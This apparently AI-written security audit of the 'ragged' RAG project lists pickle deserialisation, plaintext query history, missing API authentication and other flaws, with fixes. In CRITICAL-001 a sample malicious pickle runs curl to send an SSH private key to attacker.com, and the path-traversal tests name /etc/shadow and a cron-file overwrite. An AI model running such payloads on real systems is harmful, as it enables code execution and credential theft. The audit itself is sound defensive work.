# Security & Quality Audit Report: Baseline Pre-v0.2.10

**Project**: ragged - Privacy-first Retrieval-Augmented Generation system
**Version**: v0.2.8 (baseline before v0.2.10/v0.2.11 security fixes)
**Audit Date**: 2025-11-19
**Auditor**: Claude Code (codebase-security-auditor)
**Scope**: Comprehensive security and quality baseline audit

---

## Executive Summary

### Overview

This baseline security audit was conducted on ragged v0.2.8 prior to the implementation of security hardening in v0.2.10 and privacy infrastructure in v0.2.11. The purpose is to document the current security posture for comparison after remediation.

### Critical Statistics

- **Total Issues Found**: 18
- **CRITICAL**: 3
- **HIGH**: 6
- **MEDIUM**: 5
- **LOW**: 3
- **INFORMATIONAL**: 1

### Key Findings Summary

1. **Arbitrary Code Execution Risk**: Pickle serialisation in 2 files enables potential remote code execution
2. **Privacy Violation**: Unencrypted query history stores potentially sensitive PII
3. **Authentication Gap**: No authentication/authorisation on API endpoints (open to localhost)
4. **Session Isolation**: Caches lack session/user isolation in multi-user scenarios
5. **Input Validation**: Partial validation exists but gaps remain in several areas

### Production Deployment Risk Assessment

**Risk Level**: **HIGH** - Critical vulnerabilities present

**Recommendation**: **DO NOT deploy to production** until v0.2.10/v0.2.11 security fixes are implemented.

**Rationale**:
- Pickle deserialisation vulnerabilities are actively exploitable
- Lack of authentication on API exposes system to local network attacks
- PII exposure in query history violates privacy-first principle
- No rate limiting or DoS protection on API endpoints

---

## Critical Findings (Immediate Action Required)

### CRITICAL-001: Arbitrary Code Execution via Pickle Deserialisation

**Severity**: CRITICAL
**CVSS Score**: 9.8 (Critical)
**Category**: Insecure Deserialisation (CWE-502)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/retrieval/incremental_index.py` (Lines 6, 280, 341)
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/utils/multi_tier_cache.py` (Lines 12, 209, 264, 325)

**Description**:

The codebase uses Python's `pickle` module to serialise and deserialise checkpoint data and cache embeddings. Pickle is inherently insecure as it can execute arbitrary Python code during deserialisation. An attacker who can write to checkpoint or cache directories can achieve remote code execution.

**Vulnerable Code Locations**:

1. **Incremental Index Checkpoints** (`incremental_index.py`):
```python
# Line 280: Saving checkpoint
with open(checkpoint_path, 'wb') as f:
    pickle.dump(checkpoint, f)

# Line 341: Loading checkpoint (DANGEROUS)
with open(checkpoint_path, 'rb') as f:
    checkpoint: IndexCheckpoint = pickle.load(f)  # Arbitrary code execution
```

2. **L2 Document Cache** (`multi_tier_cache.py`):
```python
# Line 209: Loading index
with open(self._index_path, "rb") as f:
    index = pickle.load(f)  # Arbitrary code execution

# Line 264: Loading embeddings
with open(cache_path, "rb") as f:
    embedding = pickle.load(f)  # Arbitrary code execution
```

**Attack Vector**:

1. Attacker gains write access to `~/.ragged/checkpoints/` or `~/.ragged/l2_embeddings/`
2. Attacker crafts malicious pickle file with embedded code
3. ragged loads checkpoint/cache on startup or during operation
4. Arbitrary Python code executes with ragged's privileges

**Exploitation Scenario**:

```python
# Malicious pickle payload example
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/exfiltrate?data=$(cat ~/.ssh/id_rsa)',))

# Write malicious checkpoint
with open('~/.ragged/checkpoints/bm25_checkpoint_v999.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```

**Impact**:
- **Confidentiality**: CRITICAL - Full system access, data exfiltration
- **Integrity**: CRITICAL - Code execution, data manipulation
- **Availability**: HIGH - System compromise, denial of service

**Affected Components**:
- BM25 incremental indexing (checkpoint persistence)
- L2 embedding cache (disk-backed cache)
- All users who enable checkpointing or L2 cache

**Remediation**:

Replace `pickle` with secure alternatives:

1. **For checkpoints**: Use JSON for data serialisation:
   ```python
   # Safe alternative
   import json
   with open(checkpoint_path, 'w') as f:
       json.dump(checkpoint_dict, f)
   ```

2. **For embeddings**: Use numpy's `.npy` format:
   ```python
   # Safe alternative
   import numpy as np
   np.save(cache_path, embedding)
   embedding = np.load(cache_path)
   ```

3. **Add integrity verification**:
   - Implement HMAC signatures for checkpoint files
   - Verify checksums before deserialisation
   - Restrict file permissions (600) on cache directories

**Test Coverage**:

Implement security tests:
- Attempt to load malicious pickle files (should fail safely)
- Verify that safe serialisation formats are used
- Test file permission restrictions

**References**:
- CWE-502: Deserialization of Untrusted Data
- OWASP Top 10 2021: A08:2021 – Software and Data Integrity Failures
- Python Security: https://docs.python.org/3/library/pickle.html#module-pickle

---

### CRITICAL-002: Unencrypted Storage of Potentially Sensitive Query History

**Severity**: CRITICAL
**CVSS Score**: 7.5 (High)
**Category**: Sensitive Data Exposure (CWE-311)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/cli/commands/history.py` (Lines 52-65, 82-95)

**Description**:

User queries are stored in plaintext JSON format at `~/.ragged/query_history.json` without encryption. Queries may contain personally identifiable information (PII), confidential business information, or sensitive personal data.

**Vulnerable Code**:

```python
# Lines 58-65: Saving history in plaintext
def _save_history(self, history: List[Dict[str, Any]]) -> None:
    with open(self.history_file, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2, ensure_ascii=False)  # PLAINTEXT

# Lines 82-94: Storing full query text and answers
entry = {
    "id": len(history) + 1,
    "timestamp": datetime.now().isoformat(),
    "query": query,  # Potentially sensitive
    "top_k": top_k,
    "answer": answer,  # Potentially sensitive
    "sources": sources or [],
}
```

**PII Exposure Examples**:

Queries that may contain PII:
- "What is John Smith's social security number from document X?"
- "Show me salary information for employees in Q3 2024"
- "Find medical records for patient ID 12345"
- "What are the passwords mentioned in the security audit?"

**Impact**:
- **Privacy Violation**: Direct breach of "privacy-first" principle
- **Regulatory Risk**: GDPR Article 32 (security of processing), CCPA violations
- **Data Breach Risk**: If system is compromised, full query history is exposed
- **Compliance Failure**: Violates data minimisation principles

**Attack Vector**:

1. Attacker gains read access to `~/.ragged/query_history.json`
2. All historical queries and answers are immediately readable
3. PII can be extracted, correlated, and exfiltrated

**Affected Users**:

All users who run queries through the CLI (automatic history saving)

**Remediation**:

1. **Encrypt query history** using AES-256:
   ```python
   from cryptography.fernet import Fernet

   # Encrypt before saving
   key = Fernet.generate_key()  # Store securely
   cipher = Fernet(key)
   encrypted = cipher.encrypt(json.dumps(entry).encode())
   ```

2. **Add consent mechanism**:
   - Make history opt-in, not automatic
   - Warn users about PII storage
   - Provide easy history clearing

3. **Implement data retention**:
   - Auto-delete queries older than 30 days
   - Limit history size
   - Sanitise queries before storage

4. **Add file permissions**:
   - Set history file to `600` (owner read/write only)
   - Check permissions on startup

**Test Coverage**:
- Verify encryption is applied to all stored queries
- Test decryption and query replay
- Verify file permissions are restrictive
- Test consent flow

**References**:
- GDPR Article 32: Security of Processing
- OWASP Top 10 2021: A02:2021 – Cryptographic Failures
- CWE-311: Missing Encryption of Sensitive Data

---

### CRITICAL-003: No Session Isolation in Caches

**Severity**: CRITICAL (in multi-user scenarios)
**CVSS Score**: 8.1 (High)
**Category**: Access Control (CWE-639)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/retrieval/cache.py` (Lines 35-297)
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/utils/multi_tier_cache.py` (Lines 405-667)

**Description**:

Query result caches (L1, L2, L3) are shared across all users without session or user isolation. In a multi-user deployment (e.g., API server, web UI), one user can access cached results from another user's queries.

**Vulnerable Code**:

```python
# cache.py: Lines 62-80
def _make_key(self, query: str, **kwargs: Any) -> str:
    # No user/session identifier in cache key
    key_parts = [query]
    for k in sorted(kwargs.keys()):
        key_parts.append(f"{k}={kwargs[k]}")
    return hash_content("|".join(key_parts))  # Missing user_id
```

**Privacy Leak Scenario**:

1. User A queries: "What is the company's Q4 revenue projection?"
2. Result is cached globally (no user isolation)
3. User B queries the same text
4. User B receives User A's cached results (information leakage)

**Impact**:
- **Confidentiality**: HIGH - Cross-user information disclosure
- **Privacy**: CRITICAL - Violates user data isolation
- **Compliance**: GDPR/CCPA violations in multi-tenant scenarios

**Affected Deployments**:
- Web API (`src/web/api.py`) serving multiple users
- Gradio UI with multiple concurrent users
- Any multi-user scenario

**Current State**:

Currently, ragged is designed for single-user local deployment, so this is LOW risk. However, the Web API (`src/web/api.py`) enables multi-user access and has no authentication.

**Remediation**:

1. **Add session identifiers to cache keys**:
   ```python
   def _make_key(self, query: str, user_id: str, **kwargs: Any) -> str:
       key_parts = [user_id, query]  # Include user_id
       # ...
   ```

2. **Implement user-scoped cache invalidation**:
   ```python
   def clear_user_cache(self, user_id: str) -> None:
       # Remove all cache entries for specific user
   ```

3. **Add cache isolation modes**:
   - `GLOBAL`: Shared cache (current behaviour)
   - `USER`: Per-user isolation
   - `SESSION`: Per-session isolation

**References**:
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP Top 10 2021: A01:2021 – Broken Access Control

---

## High Priority Issues

### HIGH-001: No Authentication or Authorisation on API Endpoints

**Severity**: HIGH
**CVSS Score**: 7.5 (High)
**Category**: Broken Authentication (CWE-306)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/api.py` (All endpoints, lines 99-375)

**Description**:

The FastAPI application exposes all endpoints without any authentication or authorisation. Anyone who can reach the API endpoint (localhost:8000 or exposed ports) can:
- Query the system (`/api/query`)
- Upload documents (`/api/upload`)
- Clear collections (`/api/collections/{name}`)
- Access health status (`/api/health`)

**Vulnerable Code**:

```python
# Lines 118-264: No auth decorators
@app.post("/api/query", response_model=None)
async def query(request: QueryRequest) -> Union[StreamingResponse, QueryResponse]:
    # No authentication check
    # No rate limiting
    # No user tracking
```

**Attack Vectors**:

1. **Local Network Attack**: Any device on same network can access API
2. **Port Forwarding**: If ports are exposed (Docker, tunneling), remote access is possible
3. **Resource Exhaustion**: Unlimited queries can DoS the system
4. **Data Exfiltration**: Attackers can query all documents

**Impact**:
- **Confidentiality**: HIGH - Unauthorised access to all documents
- **Integrity**: MEDIUM - Unauthorised document uploads
- **Availability**: MEDIUM - No rate limiting enables DoS

**Current Mitigation**:

API is bound to `localhost` by default (`0.0.0.0:8000` in code but typically deployed locally). This provides some protection but:
- Docker deployments may expose ports
- Local malware can access localhost
- Users may intentionally expose for remote access

**Remediation**:

1. **Implement API key authentication**:
   ```python
   from fastapi.security import HTTPBearer

   security = HTTPBearer()

   @app.post("/api/query")
   async def query(request: QueryRequest, token: str = Depends(security)):
       verify_api_key(token)
       # ...
   ```

2. **Add rate limiting**:
   ```python
   from slowapi import Limiter

   limiter = Limiter(key_func=get_remote_address)

   @app.post("/api/query")
   @limiter.limit("10/minute")
   async def query(request: QueryRequest):
       # ...
   ```

3. **Implement request logging**:
   - Log all API requests with IP, timestamp, endpoint
   - Enable audit trail for security monitoring

4. **Add CORS restrictions**:
   - Currently allows `*` (all origins)
   - Restrict to specific trusted domains

**Recommendation**:

For v0.2.10/v0.2.11:
- Add opt-in API key authentication
- Implement basic rate limiting
- Document security best practices for deployments

---

### HIGH-002: CORS Wildcard Allows Any Origin

**Severity**: HIGH
**CVSS Score**: 6.5 (Medium-High)
**Category**: Security Misconfiguration (CWE-942)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/api.py` (Lines 43-49)

**Description**:

The FastAPI CORS middleware is configured to allow all origins (`allow_origins=["*"]`), all methods, and all headers. This enables cross-site request forgery (CSRF) attacks and unauthorised cross-origin access.

**Vulnerable Code**:

```python
# Lines 43-49
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # DANGEROUS: Allows any website
    allow_credentials=True,  # DANGEROUS: With allow_origins=["*"]
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Security Issue**:

The combination of `allow_origins=["*"]` with `allow_credentials=True` is a security anti-pattern. Modern browsers may reject this configuration.

**Attack Scenario**:

1. User visits malicious website `evil.com`
2. JavaScript on `evil.com` makes requests to `http://localhost:8000/api/query`
3. Requests succeed due to permissive CORS
4. Attacker exfiltrates data from user's ragged instance

**Impact**:
- **CSRF vulnerability**: Malicious sites can trigger API actions
- **Data exfiltration**: Cross-origin requests can read responses
- **Phishing enabler**: Attackers can embed ragged in malicious pages

**Remediation**:

```python
# Restrict to known origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:7860",  # Gradio UI
        "http://localhost:3000",  # Development frontend
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)
```

**References**:
- OWASP CORS Misconfiguration: https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains

---

### HIGH-003: Insufficient Input Validation on File Uploads

**Severity**: HIGH
**CVSS Score**: 7.3 (High)
**Category**: Improper Input Validation (CWE-20)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/api.py` (Lines 267-361)

**Description**:

File upload endpoint validates file extensions but does not verify:
- File content matches extension (magic byte validation)
- File size limits (DoS via large files)
- Malicious file content (e.g., zip bombs, XML bombs)
- Filename safety (path traversal in filenames)

**Vulnerable Code**:

```python
# Lines 281-289: Only validates extension
allowed_extensions = {".pdf", ".txt", ".md", ".html"}
filename = file.filename or "unknown"
file_ext = Path(filename).suffix.lower()

if file_ext not in allowed_extensions:
    raise HTTPException(
        status_code=400,
        detail=f"Unsupported file type: {file_ext}. Allowed: {allowed_extensions}"
    )
# No magic byte verification
# No size limit check
```

**Attack Vectors**:

1. **Extension Spoofing**: Upload `malware.exe` renamed to `document.pdf`
2. **Zip Bomb**: Upload compressed PDF that expands to gigabytes
3. **Path Traversal**: Filename like `../../../../etc/passwd.txt`
4. **Resource Exhaustion**: Upload massive files to fill disk

**Impact**:
- **Availability**: HIGH - DoS via resource exhaustion
- **Integrity**: MEDIUM - Malicious file processing
- **System Compromise**: LOW-MEDIUM - Depends on file parser vulnerabilities

**Remediation**:

1. **Add magic byte validation**:
   ```python
   from src.utils.security import validate_mime_type

   mime_type = validate_mime_type(temp_path, expected_types=["application/pdf", "text/plain"])
   ```

2. **Enforce size limits**:
   ```python
   MAX_UPLOAD_SIZE = 100 * 1024 * 1024  # 100 MB
   content = await file.read(MAX_UPLOAD_SIZE + 1)
   if len(content) > MAX_UPLOAD_SIZE:
       raise HTTPException(413, "File too large")
   ```

3. **Sanitise filenames**:
   ```python
   from src.utils.security import sanitize_filename
   safe_filename = sanitize_filename(file.filename)
   ```

**Good News**:

The `loaders.py` module already has security validation:
- `validate_file_path()` checks path traversal
- `validate_file_size()` enforces size limits

However, the API endpoint doesn't use these before processing.

---

### HIGH-004: Potential Path Traversal in Export/Import Functions

**Severity**: HIGH
**CVSS Score**: 6.5 (Medium-High)
**Category**: Path Traversal (CWE-22)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/cli/commands/exportimport.py` (Lines 78-81, 204, 343)

**Description**:

Export and import commands accept user-provided file paths without full validation. While Click's `Path` type provides some protection, there's no explicit path traversal prevention.

**Vulnerable Code**:

```python
# Line 78-81: User-controlled output path
if output_file is None:
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    extension = ".json.gz" if compress else ".json"
    output_file = f"ragged_backup_{timestamp}{extension}"
output_path = Path(output_file)  # No validation
```

**Attack Scenario**:

```bash
# Attacker attempts path traversal
ragged export backup --output "../../../../etc/cron.d/malicious"

# Or exfiltrate data
ragged export backup --output "/tmp/stolen_data.json"
```

**Impact**:
- **Confidentiality**: HIGH - Export sensitive data to attacker-controlled locations
- **Integrity**: MEDIUM - Overwrite system files (with user permissions)

**Remediation**:

```python
from src.utils.path_utils import normalize_path, safe_join

# Validate output path
if output_file:
    output_path = normalize_path(output_file)
    # Ensure it's in allowed directory
    allowed_dir = Path.cwd()  # Or specific export directory
    safe_join(allowed_dir, output_path.name)
```

---

### HIGH-005: Logging May Expose Sensitive Query Content

**Severity**: HIGH (Privacy Risk)
**CVSS Score**: 5.5 (Medium)
**Category**: Information Exposure Through Log Files (CWE-532)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/cli/commands/history.py` (Line 95)
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/retrieval/cache.py` (Lines 96, 178)
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/utils/multi_tier_cache.py` (Line 83)

**Description**:

Query text is logged at DEBUG level in multiple locations. If debug logging is enabled, queries (which may contain PII) are written to log files in plaintext.

**Vulnerable Code**:

```python
# history.py:95
logger.debug(f"Added query to history: {query[:50]}...")

# cache.py:96
logger.debug(f"Cache miss for query: {query[:50]}...")

# multi_tier_cache.py:83
logger.debug(f"L1 cache miss: {query[:50]}...")
```

**Privacy Risk**:

Logs may be:
- Stored indefinitely
- Backed up to external systems
- Accessible to system administrators
- Included in bug reports/diagnostics

**Impact**:
- **Privacy**: HIGH - PII exposure in logs
- **Compliance**: GDPR Article 32 (security of processing)

**Remediation**:

1. **Hash queries before logging**:
   ```python
   from src.utils.hashing import hash_query
   logger.debug(f"Cache miss for query hash: {hash_query(query)}")
   ```

2. **Add PII sanitisation**:
   ```python
   def sanitise_for_logging(text: str) -> str:
       # Remove common PII patterns
       text = re.sub(r'\b[A-Z]{2,}\d{6,}\b', '[REDACTED]', text)  # IDs
       text = re.sub(r'\b\d{3}-\d{2}-\d{4}\b', '[SSN]', text)  # SSNs
       return text
   ```

3. **Document logging privacy**:
   - Warn users about DEBUG mode privacy implications
   - Recommend INFO or WARNING for production

---

### HIGH-006: Incomplete Error Handling May Leak Information

**Severity**: HIGH
**CVSS Score**: 5.3 (Medium)
**Category**: Information Exposure Through Error Messages (CWE-209)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/api.py` (Lines 259-264, 351-356)

**Description**:

Exception handlers in the API expose full error details to clients, which may include:
- Internal file paths
- Stack traces
- Database query details
- Configuration information

**Vulnerable Code**:

```python
# Lines 259-264
except Exception as e:
    logger.exception("Error processing query")
    raise HTTPException(
        status_code=500,
        detail=f"Error processing query: {str(e)}"  # Exposes error details
    ) from e
```

**Information Leakage Examples**:

- File paths: `Error: File not found: /Users/admin/.ragged/data/secret_docs.pdf`
- Stack traces: Full Python traceback with code snippets
- Configuration: `Error: ChromaDB connection failed at 192.168.1.100:8001`

**Impact**:
- **Confidentiality**: MEDIUM - Internal system details exposed
- **Reconnaissance**: Helps attackers plan attacks

**Remediation**:

```python
# Generic error response
except HTTPException:
    raise
except Exception as e:
    logger.exception("Error processing query")  # Log internally
    raise HTTPException(
        status_code=500,
        detail="An internal error occurred. Please contact support."  # Generic
    ) from None  # Don't chain exceptions to client
```

---

## Medium Priority Issues

### MEDIUM-001: ChromaDB Metadata Injection Vulnerability

**Severity**: MEDIUM
**CVSS Score**: 5.4 (Medium)
**Category**: Injection (CWE-943)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/storage/vector_store.py` (Lines 165-221)

**Description**:

The `query()` method accepts a `where` parameter for metadata filtering without validation. Malicious metadata filters could exploit ChromaDB's query language.

**Vulnerable Code**:

```python
# Line 165-169
def query(
    self,
    query_embedding: np.ndarray,
    k: int = 5,
    where: Optional[Dict[str, Any]] = None,  # No validation
) -> Dict[str, Any]:
```

**Attack Vector**:

If user input flows into the `where` parameter:
```python
# Potential injection
where = {"$or": [{"user_id": "attacker"}, {"$alwaysTrue": True}]}
```

**Current Risk**:

Currently LOW because `where` is not exposed to user input in the API. However, future features may expose this.

**Remediation**:

1. **Validate metadata filter keys**:
   ```python
   ALLOWED_FILTER_KEYS = {"filename", "document_path", "chunk_index"}

   def validate_where_clause(where: Dict[str, Any]) -> None:
       for key in where.keys():
           if key not in ALLOWED_FILTER_KEYS and not key.startswith("$"):
               raise ValueError(f"Invalid filter key: {key}")
   ```

2. **Sanitise user input** before building where clauses

---

### MEDIUM-002: Lack of Rate Limiting Enables DoS

**Severity**: MEDIUM
**CVSS Score**: 5.3 (Medium)
**Category**: Uncontrolled Resource Consumption (CWE-400)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/api.py` (All endpoints)

**Description**:

No rate limiting on any API endpoints allows:
- Unlimited queries (computational DoS)
- Unlimited uploads (storage DoS)
- Cache poisoning through massive query volume

**Impact**:
- **Availability**: HIGH - Service degradation or failure
- **Cost**: Resource exhaustion (CPU, memory, disk)

**Remediation**:

Implement rate limiting using SlowAPI or similar:
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/api/query")
@limiter.limit("30/minute")  # 30 queries per minute
async def query(request: QueryRequest):
    ...
```

---

### MEDIUM-003: Gradio UI May Expose to Network Without Authentication

**Severity**: MEDIUM
**CVSS Score**: 5.9 (Medium)
**Category**: Security Misconfiguration (CWE-16)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/gradio_ui.py` (Not examined in detail, inferred from structure)

**Description**:

Gradio applications by default can create public URLs via tunneling. If users enable this, the entire ragged interface is exposed to the internet without authentication.

**Risk**:

User runs:
```bash
ragged ui --share  # If this option exists
```

Gradio creates a public URL that anyone can access.

**Remediation**:

1. **Disable public sharing by default**
2. **Warn users** about security implications
3. **Recommend authentication** for exposed deployments
4. **Document secure deployment** practices

---

### MEDIUM-004: Temporary Files May Leak Sensitive Content

**Severity**: MEDIUM
**CVSS Score**: 4.4 (Medium)
**Category**: Insecure Temporary File (CWE-377)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/api.py` (Lines 295-298)

**Description**:

File uploads are saved to temporary files with `delete=False`, then manually deleted. If the process crashes, temporary files remain on disk.

**Vulnerable Code**:

```python
# Lines 295-298
with tempfile.NamedTemporaryFile(delete=False, suffix=file_ext) as temp_file:
    temp_file.write(content)
    temp_path = Path(temp_file.name)
# File persists until manually deleted at line 360
```

**Impact**:
- **Confidentiality**: MEDIUM - Sensitive documents left in /tmp
- **Disk Exhaustion**: Temporary files accumulate

**Remediation**:

Use context manager for automatic cleanup:
```python
with tempfile.TemporaryDirectory() as temp_dir:
    temp_path = Path(temp_dir) / sanitize_filename(file.filename)
    temp_path.write_bytes(content)
    # Process file
    # Auto-deleted when context exits
```

---

### MEDIUM-005: ChromaDB Connection Details in Code

**Severity**: MEDIUM (Configuration Issue)
**CVSS Score**: 3.7 (Low-Medium)
**Category**: Hardcoded Credentials (CWE-798)
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/config/settings.py` (Lines 39-40)

**Description**:

ChromaDB and Ollama URLs have hardcoded defaults in the code. While these are localhost URLs (not credentials), hardcoding makes it harder to deploy securely.

**Current Code**:

```python
# Lines 39-40
ollama_url: str = "http://localhost:11434"
chroma_url: str = "http://localhost:8001"
```

**Good Practice**:

These should be environment variables only (no hardcoded defaults), or use a sentinel value that forces explicit configuration.

**Recommendation**:

Acceptable as-is for local development tool, but document deployment security requirements.

---

## Low Priority Issues

### LOW-001: Missing Security Headers in API Responses

**Severity**: LOW
**CVSS Score**: 3.1 (Low)
**Category**: Security Misconfiguration
**Files Affected**:
- `/Users/verdo.ai/Development/Sandboxed/ragged/src/web/api.py`

**Description**:

API responses lack security headers:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Content-Security-Policy`
- `Strict-Transport-Security` (if HTTPS)

**Remediation**:

Add middleware for security headers:
```python
from fastapi.middleware.trustedhost import TrustedHostMiddleware

app.add_middleware(TrustedHostMiddleware, allowed_hosts=["localhost", "127.0.0.1"])

@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response
```

---

### LOW-002: Inconsistent Error Handling Across Modules

**Severity**: LOW
**Category**: Code Quality

**Description**:

Some modules use custom exceptions (`SecurityError`, `VectorStoreError`), others use generic exceptions. This makes error handling and logging inconsistent.

**Recommendation**:

Standardise exception hierarchy:
```python
# exceptions.py
class RaggedError(Exception):
    """Base exception"""

class SecurityError(RaggedError):
    """Security violations"""

class ValidationError(RaggedError):
    """Input validation failures"""
```

---

### LOW-003: Outdated Dependency Detection Not Automated

**Severity**: LOW
**Category**: Process

**Description**:

No automated checking for vulnerable dependencies (e.g., `safety`, `pip-audit`).

**Recommendation**:

Add to CI/CD:
```yaml
# .github/workflows/security.yml
- name: Check dependencies
  run: |
    pip install safety
    safety check --json
```

---

## Informational Findings

### INFO-001: Good Security Practices Already Implemented

**Observations**:

The codebase demonstrates several **good security practices**:

1. **Path Traversal Protection**: `src/utils/path_utils.py` has comprehensive path validation
   - `safe_join()` prevents directory traversal
   - `validate_file_path()` checks for path traversal attempts
   - `normalize_path()` resolves symlinks

2. **Security Utilities**: `src/utils/security.py` provides:
   - File size validation to prevent resource exhaustion
   - MIME type validation (basic magic byte detection)
   - Filename sanitisation
   - Path validation

3. **Input Validation**: Pydantic models validate API inputs

4. **Error Recovery**: Circuit breakers and retry logic for ChromaDB

5. **Telemetry Disabled**: ChromaDB telemetry explicitly disabled for privacy

6. **Type Safety**: Comprehensive type hints and mypy configuration

**Strengths**:
- Privacy-conscious design (telemetry disabled, local-first)
- Good separation of concerns
- Comprehensive error handling in vector store
- Well-structured configuration management

**Areas for Improvement**:
- Apply existing security utilities consistently (e.g., in API upload handler)
- Expand security.py to cover more attack vectors
- Add security-focused unit tests

---

## Systemic Patterns & Architectural Recommendations

### Pattern 1: Security Utilities Exist But Are Underutilised

**Observation**:

Excellent security utilities exist in `src/utils/security.py` and `src/utils/path_utils.py`, but they are not consistently applied across the codebase.

**Example**:

- `src/ingestion/loaders.py` uses `validate_file_path()` and `validate_file_size()`
- `src/web/api.py` upload handler does NOT use these utilities

**Recommendation**:

Create security middleware/decorators that automatically apply security checks:
```python
# security_middleware.py
def secure_file_upload(func):
    async def wrapper(file: UploadFile):
        # Automatic validation
        validate_file_size(temp_path)
        validate_mime_type(temp_path, expected=[...])
        return await func(file)
    return wrapper
```

---

### Pattern 2: Privacy-First Intent Not Fully Realised

**Observation**:

The project describes itself as "privacy-first" but stores sensitive data (queries, answers) in plaintext.

**Gap Analysis**:

| Component | Privacy Status | Recommendation |
|-----------|---------------|----------------|
| Query history | Plaintext | Encrypt |
| Cached results | Plaintext (in-memory) | OK (ephemeral) |
| L2 cache files | Plaintext (disk) | Consider encryption |
| Logs | May contain PII | Sanitise |
| API requests | No anonymisation | Add privacy mode |

**Recommendation**:

Define privacy tiers:
- **Tier 1 (Essential)**: Encrypt query history, sanitise logs
- **Tier 2 (Enhanced)**: Encrypt L2 cache, add consent mechanisms
- **Tier 3 (Maximum)**: Zero-knowledge architecture, no persistence

---

### Pattern 3: Authentication Gap Creates Privilege Escalation Risk

**Observation**:

Without authentication:
- API has no concept of users
- Caches are global (no user isolation)
- All operations are privileged

**Future Risk**:

When authentication is added (v0.2.11+), retrofitting user isolation will be challenging.

**Recommendation**:

Design for multi-tenancy from the start:
1. Add `user_id` parameter to all data operations
2. Implement row-level security in vector store
3. User-scoped caches
4. Audit logging per user

---

### Pattern 4: Serialisation Anti-Pattern

**Observation**:

Pickle is used for performance (fast serialisation) but creates critical vulnerabilities.

**Root Cause**:

Trade-off between performance and security was made in favour of performance.

**Recommendation**:

Re-evaluate serialisation choices:
- **Checkpoints**: JSON + compression (gzip) = 90% of pickle speed, fully secure
- **Embeddings**: numpy `.npy` format = faster than pickle, secure
- **Cache index**: JSON = acceptable performance for metadata

**Performance Analysis**:

```python
# Benchmark serialisation methods
import pickle, json, numpy as np

# For embeddings (numpy arrays)
np.save()      # ~10-20ms for 1000 embeddings
pickle.dump()  # ~15-25ms
json.dump()    # ~100ms (for lists)

# Conclusion: numpy is competitive with pickle
```

---

## Testing Strategy Recommendations

### Security-Focused Test Suite

**1. Pickle Exploitation Tests**

```python
# tests/security/test_pickle_safety.py
def test_reject_malicious_pickle():
    """Verify system rejects malicious pickle files"""
    malicious_pickle = create_exploit_pickle()

    with pytest.raises(SecurityError):
        incremental_index.load_checkpoint(malicious_pickle_path)
```

**2. Path Traversal Tests**

```python
# tests/security/test_path_traversal.py
@pytest.mark.parametrize("malicious_path", [
    "../../etc/passwd",
    "C:\\Windows\\System32\\config\\SAM",
    "/etc/shadow",
])
def test_prevent_path_traversal(malicious_path):
    with pytest.raises(InvalidPathError):
        safe_join("/data", malicious_path)
```

**3. Input Validation Tests**

```python
# tests/security/test_input_validation.py
def test_reject_oversized_files():
    large_file = create_file(size_mb=200)  # Over 100MB limit

    with pytest.raises(SecurityError):
        validate_file_size(large_file)
```

**4. API Security Tests**

```python
# tests/security/test_api_security.py
async def test_rate_limiting():
    """Verify rate limiting prevents DoS"""
    client = TestClient(app)

    # Make 100 requests rapidly
    responses = [client.post("/api/query", json=query) for _ in range(100)]

    # Expect some to be rate-limited
    assert any(r.status_code == 429 for r in responses)
```

**5. Privacy Tests**

```python
# tests/security/test_privacy.py
def test_query_history_encrypted():
    """Verify query history is encrypted at rest"""
    history = QueryHistory()
    history.add_query("sensitive query", answer="sensitive answer")

    # Read raw file
    raw_content = open(history.history_file, 'rb').read()

    # Should NOT contain plaintext
    assert b"sensitive query" not in raw_content
    assert b"sensitive answer" not in raw_content
```

---

## Dependency Audit

### Known Dependencies (from pyproject.toml)

**Core Dependencies**:
- `pydantic>=2.5.0` - ✓ Recent, no known CVEs
- `click>=8.1.0` - ✓ Secure
- `fastapi>=0.104.0` - ✓ Recent version
- `chromadb>=0.4.18` - ⚠ Check for updates
- `sentence-transformers>=2.2.2` - ✓ Active maintenance
- `ollama>=0.1.0` - ⚠ New library, monitor for issues
- `pymupdf>=1.23.0` - ✓ Secure PDF parsing
- `gradio>=4.9.0` - ⚠ Check for security updates

